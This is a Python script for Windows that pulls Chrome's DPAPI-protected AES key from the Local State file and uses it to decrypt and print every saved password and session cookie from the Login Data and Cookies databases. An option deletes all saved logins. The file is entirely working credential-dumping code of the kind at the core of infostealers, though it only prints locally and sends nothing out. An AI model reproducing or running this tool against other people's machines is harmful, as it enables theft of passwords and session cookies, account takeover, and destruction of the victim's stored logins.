import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import argparse
from datetime import timezone, datetime, timedelta

class colors:
    red = "\u001b[31m"
    green = "\u001b[32m"
    yellow = "\u001b[33m"
    blue = "\u001b[34m"
    white = "\u001b[37m"


def get_chrome_datetime(chromedate):
    """Format is year-month-date hr:mins:seconds.milliseconds
    Converts Chrome's date (microseconds since January, 1601) into a format easier to understand"""

    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    """Obtains and decodes AES key used by Chrome
    C: => Users => <Name> => AppData => Local => Google => Chrome => User Data => Local State
    Stored as a JSON file"""

    local_state_path = os.path.join(os.environ["USERPROFILE"], 
    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
    #Use AES key to decrypt password and display in human readable format

    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, None, 0)[1])
        except:
            return colors.red + "No Password"
        
def cookie_decryption(cookie, encryption_key):
    # Use AES key to decrypt cookies and display in human readable format

    try:
        iv = cookie[3:15]
        cookie = cookie[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(cookie)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(cookie, None, None, None, 0)[1])
        except:
            return colors.red + "No Cookie"
        
def main():

    msg = "A Python script to extract and delete info stored in Chrome"
    parser = argparse.ArgumentParser(description=msg)
    parser.add_argument("--passwords", help="Displays all logins stored in chrome", action="store_true")
    parser.add_argument("--delete", help="Deletes all logins stored in chrome", action="store_true")
    parser.add_argument("--cookies", help="Displays all cookies stored in chrome", action="store_true")
    args = parser.parse_args()

    if args.passwords:
        key = get_encryption_key()

        db_path = os.path.join(os.environ["USERPROFILE"], 
        "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins " 
                       "order by date_created")

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]
          
            if user_name or decrypted_password:
                print(colors.green + f"[+] Main URL: {main_url}")
                print(colors.green + f"[+] Login URL: {login_page_url}")
                print(colors.green + f"[+] Username: {user_name}")
                print(colors.green + f"[+] Decrypted password: {decrypted_password}")
          
            else:
                continue
          
            if date_of_creation != 86400000000 and date_of_creation:
                print(colors.green + f"[+] Creation date: {str(get_chrome_datetime(date_of_creation))}")
          
            if last_usuage != 86400000000 and last_usuage:
                print(colors.green + f"[+] Last used: {str(get_chrome_datetime(last_usuage))}")

            print(colors.blue + "=" * 50)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        print(colors.white)

    if args.delete:

        db_path = os.path.join(os.environ["USERPROFILE"], 
        "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

        db = sqlite3.connect(db_path)
        cursor = db.cursor()

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                       "order by date_created")
        n_logins = len(cursor.fetchall())

        try:
            cursor.execute("delete from logins")
            cursor.connection.commit()
            print(colors.green + f"[+] Deleted {n_logins} saved logins")
        except:
            print(colors.red + f"[+] Failed to delete logins")

        print(colors.white)

    if args.cookies:
        db_path = os.path.join(os.environ["USERPROFILE"], 
                               "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        
        filename = "Cookies.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)

        db.text_factory = lambda b: b.decode(errors="ignore")
        cursor = db.cursor()

        cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
        # WHERE host_key like '%example.com%'

        key = get_encryption_key()

        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = cookie_decryption(encrypted_value, key)
            else:
                decrypted_value = value

            print(colors.green + f"[+] Host: {host_key}")
            print(colors.green + f"[+] Cookie name: {name}")
            print(colors.green + f"[+] Cookie value: {decrypted_value}")
            print(colors.green + f"[+] Creation date: {get_chrome_datetime(creation_utc)}")
            print(colors.green + f"[+] Last used: {get_chrome_datetime(last_access_utc)}")
            print(colors.green + f"[+] Expires: {get_chrome_datetime(expires_utc)}")
            print(colors.blue + "=" * 50)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        print(colors.white)

if __name__ == "__main__":
    main()